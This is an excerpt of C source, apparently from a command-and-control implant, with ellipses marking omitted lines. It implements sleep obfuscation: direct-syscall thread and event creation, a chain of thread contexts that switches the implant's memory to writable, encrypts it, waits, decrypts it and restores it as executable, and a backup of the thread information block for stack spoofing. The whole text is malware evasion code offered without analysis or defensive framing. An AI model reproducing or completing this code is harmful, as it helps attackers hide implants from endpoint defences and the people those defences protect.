    ...
    if ( NT_SUCCESS( SysNtCreateEvent( &hEvent, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE ) ) )
    {
        if ( NT_SUCCESS( SysNtCreateThreadEx( &hThread, THREAD_ALL_ACCESS, NULL, NtCurrentProcess(), Instance->Config.Implant.ThreadStartAddr, NULL, TRUE, 0, 0x1000 * 20, 0x1000 * 20, NULL ) ) )
        {
            ...
            if ( NT_SUCCESS( SysNtDuplicateObject( NtCurrentProcess(), NtCurrentThread(), NtCurrentProcess(), &hDupObj, THREAD_ALL_ACCESS, 0, 0 ) ) )
            {
                ...
                {
                    memcpy( RopBegin,    RopInit, sizeof( CONTEXT ) );
                    memcpy( RopSetMemRw, RopInit, sizeof( CONTEXT ) );
                    memcpy( RopMemEnc,   RopInit, sizeof( CONTEXT ) );
                    memcpy( RopGetCtx,   RopInit, sizeof( CONTEXT ) );
                    memcpy( RopSetCtx,   RopInit, sizeof( CONTEXT ) );
                    memcpy( RopWaitObj,  RopInit, sizeof( CONTEXT ) );
                    memcpy( RopMemDec,   RopInit, sizeof( CONTEXT ) );
                    memcpy( RopSetMemRx, RopInit, sizeof( CONTEXT ) );
                    memcpy( RopSetCtx2,  RopInit, sizeof( CONTEXT ) );
                    memcpy( RopExitThd,  RopInit, sizeof( CONTEXT ) );
            ...
            if ( NT_SUCCESS( NtStatus ) )
            {
                ...
                if ( NT_SUCCESS( NtStatus ) )
                {
                    ...
                    if ( Instance->Config.Implant.StackSpoof )
                    {
                        ...
                        /* NtTib backup */
                        memcpy( &BkpTib, &Instance->Teb->NtTib, sizeof( NT_TIB ) );
                    }
